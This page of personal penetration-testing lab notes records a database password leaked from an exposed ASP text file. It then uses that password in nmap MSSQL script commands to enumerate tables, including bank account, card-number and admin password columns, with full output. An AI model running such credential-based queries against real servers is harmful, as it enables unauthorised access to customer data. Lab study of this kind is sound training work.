@@ -1,0 +1,140 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>found creds</title>
+</head><body>http://10.11.1.31/login-off.asp.txt<br/>
+<br/>
+<br/>
+User ID=sa;PWD=poiuytrewq;DATABASE=bankdb"<br/>
+<br/>
+remember, when searching through files in terminal and stuff is all gobbledygook, try viewing it in the web browser.<br/>
+<br/>
+<br/>
+making progress<br/>
+nmap 10.11.1.31 -p1433 --script=ms-sql-query.nse --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-query.query='select * from '<br/>
+<br/>
+<br/>
+<b>nmap 10.11.1.31 -p1433 --script=ms-sql-query.nse --script-args mssql.username='sa',mssql.password='poiuytrewq',database='bankdb',mssql-query.query='select * from tblcustomers'<br/>
+</b><br/>
+root@:~&gt; nmap 10.11.1.31 -p1433 --script=ms-sql-tables.nse --script-args mssql.username='sa',mssql.password='poiuytrewq',database='bankdb'<br/>
+<br/>
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-06-18 17:53 CDT<br/>
+Nmap scan report for 10.11.1.31<br/>
+Host is up (0.039s latency).<br/>
+<br/>
+PORT &nbsp; &nbsp; STATE SERVICE<br/>
+1433/tcp open &nbsp;ms-sql-s<br/>
+| ms-sql-tables: <br/>
+| &nbsp; [10.11.1.31:1433]<br/>
+| &nbsp; &nbsp; &nbsp; ASP<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; table&#09;column&#09;type&#09;length<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; =====&#09;======&#09;====&#09;======<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; dtproperties&#09;id&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; dtproperties&#09;lvalue&#09;image&#09;16<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; dtproperties&#09;objectid&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; dtproperties&#09;property&#09;varchar&#09;64<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; dtproperties&#09;uvalue&#09;nvarchar&#09;510<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; dtproperties&#09;uvalue&#09;sysname&#09;510<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; dtproperties&#09;value&#09;varchar&#09;255<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; dtproperties&#09;version&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; OCAssignments&#09;Assignment&#09;text&#09;16<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; OCAssignments&#09;AssignmentDescription&#09;text&#09;16<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; OCAssignments&#09;AssignmentID&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; OCAssignments&#09;AssignmentName&#09;varchar&#09;100<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; OCAssignments&#09;CourseID&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; bankdb<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; table&#09;column&#09;type&#09;length<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; =====&#09;======&#09;====&#09;======<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; T_accounts&#09;acc_num&#09;numeric&#09;9<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; T_accounts&#09;balance&#09;numeric&#09;9<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; T_accounts&#09;cc_num&#09;numeric&#09;9<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; T_accounts&#09;f_name&#09;varchar&#09;50<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; T_accounts&#09;id&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; T_accounts&#09;id_num&#09;numeric&#09;9<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; T_accounts&#09;l_name&#09;varchar&#09;50<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; tblCustomers&#09;cust_account&#09;numeric&#09;9<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; tblCustomers&#09;cust_id&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; tblCustomers&#09;cust_name&#09;varchar&#09;30<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; tblCustomers&#09;cust_password&#09;varchar&#09;30<br/>
+| &nbsp; &nbsp; &nbsp; Northwind<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; table&#09;column&#09;type&#09;length<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; =====&#09;======&#09;====&#09;======<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;CustomerID&#09;nchar&#09;10<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;EmployeeID&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;Freight&#09;money&#09;8<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;OrderDate&#09;datetime&#09;8<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;OrderID&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;RequiredDate&#09;datetime&#09;8<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipAddress&#09;nvarchar&#09;120<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipAddress&#09;sysname&#09;120<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipCity&#09;nvarchar&#09;30<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipCity&#09;sysname&#09;30<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipCountry&#09;nvarchar&#09;30<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipCountry&#09;sysname&#09;30<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipName&#09;nvarchar&#09;80<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipName&#09;sysname&#09;80<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShippedDate&#09;datetime&#09;8<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipPostalCode&#09;nvarchar&#09;20<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipPostalCode&#09;sysname&#09;20<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipRegion&#09;nvarchar&#09;30<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipRegion&#09;sysname&#09;30<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Orders&#09;ShipVia&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;CategoryID&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;Discontinued&#09;bit&#09;1<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;ProductID&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;ProductName&#09;nvarchar&#09;80<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;ProductName&#09;sysname&#09;80<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;QuantityPerUnit&#09;nvarchar&#09;40<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;QuantityPerUnit&#09;sysname&#09;40<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;ReorderLevel&#09;smallint&#09;2<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;SupplierID&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;UnitPrice&#09;money&#09;8<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;UnitsInStock&#09;smallint&#09;2<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Products&#09;UnitsOnOrder&#09;smallint&#09;2<br/>
+| &nbsp; &nbsp; &nbsp; pubs<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; table&#09;column&#09;type&#09;length<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; =====&#09;======&#09;====&#09;======<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;city&#09;id&#09;20<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;city&#09;tid&#09;20<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;city&#09;varchar&#09;20<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;state&#09;char&#09;2<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;state&#09;empid&#09;2<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;stor_address&#09;id&#09;40<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;stor_address&#09;tid&#09;40<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;stor_address&#09;varchar&#09;40<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;stor_id&#09;char&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;stor_id&#09;empid&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;stor_name&#09;id&#09;40<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;stor_name&#09;tid&#09;40<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;stor_name&#09;varchar&#09;40<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;zip&#09;char&#09;5<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; stores&#09;zip&#09;empid&#09;5<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; titleauthor&#09;au_id&#09;id&#09;11<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; titleauthor&#09;au_id&#09;tid&#09;11<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; titleauthor&#09;au_id&#09;varchar&#09;11<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; titleauthor&#09;au_ord&#09;tinyint&#09;1<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; titleauthor&#09;royaltyper&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; titleauthor&#09;title_id&#09;id&#09;6<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; titleauthor&#09;title_id&#09;tid&#09;6<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; titleauthor&#09;title_id&#09;varchar&#09;6<br/>
+| &nbsp; &nbsp; &nbsp; ValidUsers<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; table&#09;column&#09;type&#09;length<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; =====&#09;======&#09;====&#09;======<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Admins&#09;email&#09;varchar&#09;50<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Admins&#09;Fname&#09;varchar&#09;50<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Admins&#09;id&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Admins&#09;Lname&#09;varchar&#09;50<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Admins&#09;passwd&#09;varchar&#09;14<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Admins&#09;priSvr&#09;varchar&#09;25<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Logins&#09;active&#09;bit&#09;1<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Logins&#09;id&#09;int&#09;4<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Logins&#09;login&#09;varchar&#09;12<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Logins&#09;pass&#09;varchar&#09;14<br/>
+| &nbsp; &nbsp; &nbsp; <br/>
+| &nbsp; &nbsp; &nbsp; Restrictions<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Output restricted to 2 tables (see ms-sql-tables.maxtables)<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; Output restricted to 5 databases (see ms-sql-tables.maxdb)<br/>
+|_ &nbsp; &nbsp; &nbsp; &nbsp;No filter (see ms-sql-tables.keywords)<br/>
+MAC Address: 00:50:56:89:68:22 (VMware)<br/>
+</body></html>
